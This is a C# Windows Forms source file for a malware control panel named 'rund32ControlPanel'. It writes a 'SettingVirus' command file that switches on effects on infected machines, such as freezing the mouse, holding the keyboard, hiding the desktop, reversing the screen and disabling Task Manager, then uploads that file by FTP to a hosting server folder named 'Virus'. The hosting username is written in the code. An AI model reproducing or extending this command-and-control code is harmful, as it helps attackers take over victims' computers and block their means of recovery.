using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using FTP_client;

namespace rund32ControlPanel
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        FtpClient ftp = new FtpClient();

        private void button1_Click(object sender, EventArgs e)
        {
            string id = textBox1.Text;
            ftp.Host = "ftp.aabot.zyro.com";
            ftp.UserName = "u662536153";
            ftp.Password = ""; //FTP pass

            StreamWriter sw = File.CreateText("SettingVirus" + id + ".txt");
            sw.WriteLine(textBox1.Text);
            if (checkBox1.Checked) sw.WriteLine("Restart");
            if (checkBox2.Checked) sw.WriteLine("HideWindow");
            if (checkBox3.Checked) sw.WriteLine("MouseStop");
            if (checkBox4.Checked) sw.WriteLine("HideDescTop");
            if (checkBox5.Checked) sw.WriteLine("ReverseScreen");
            if (checkBox6.Checked) sw.WriteLine("HoldKeyboard");
            if (checkBox7.Checked) sw.WriteLine("MultiMouse");
            if (checkBox8.Checked) sw.WriteLine("DispetcherDisable");
            if (checkBox9.Checked) 
            { 
                sw.WriteLine("Message");
                sw.WriteLine(textBox5.Text);
                sw.WriteLine(textBox6.Text);
                sw.WriteLine(textBox2.Text+" ");
                sw.WriteLine(textBox3.Text+" ");
                sw.WriteLine(textBox4.Text+" ");
                sw.WriteLine(Convert.ToSingle(numericUpDown1.Value)); 
            }
            sw.Close();
            try
            {
                ftp.UploadFile("/zyro/gallery/files/Virus/", "SettingVirus" + id + ".txt");
            }
            catch (Exception)
            {
               // MessageBox.Show(ex.Message);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            checkBox1.Checked = false;
            checkBox2.Checked = false;
            checkBox3.Checked = false;
            checkBox4.Checked = false;
            checkBox5.Checked = false;
            checkBox6.Checked = false;
            checkBox7.Checked = false;
            checkBox8.Checked = false;
            checkBox9.Checked = false;
            button1.PerformClick();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            
        }
    }
}
